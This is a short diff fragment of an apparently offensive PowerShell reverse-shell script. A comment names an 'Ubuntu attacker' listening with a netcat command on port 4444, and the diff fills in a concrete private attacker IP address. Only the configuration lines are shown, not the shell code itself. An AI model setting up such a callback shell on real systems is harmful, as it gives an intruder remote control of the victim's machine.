@@ -2,7 +2,7 @@
 # Connects back to the Ubuntu attacker with rlwrap nc -lvnp 4444.
 
 # >>> EDIT THESE <<<
-$AttackerIP = "YOUR_UBUNTU_IP"  # <--- CHANGE THIS to your Ubuntu IP (e.g., "192.168.1.50")
+$AttackerIP = "172.16.10.10"
 $Port       = 4444
 
 try {
